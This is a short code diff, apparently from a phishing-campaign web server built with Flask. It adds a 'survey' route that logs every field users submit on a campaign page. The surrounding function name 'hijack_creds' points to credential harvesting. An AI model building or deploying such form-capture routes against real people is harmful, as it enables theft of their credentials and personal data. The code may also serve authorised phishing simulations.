@@ -229,6 +229,16 @@ def hijack_creds():
 
     return redirect(url_for("routes." + dict["redirect_url"]))
 
+@routes.route("/survey_stage", methods=["GET", "POST"])
+def survey():
+    if request.method == 'POST':
+        print "-" * 80
+        for key in request.form:
+            print "\t" + key + ':' + request.form[key]
+        print "-" * 80
+    return render_template("active_campaign_templates/survey.html", request=request)
+
+
 ###############[ END DEBUG ]############################
 app.register_blueprint(routes)
 
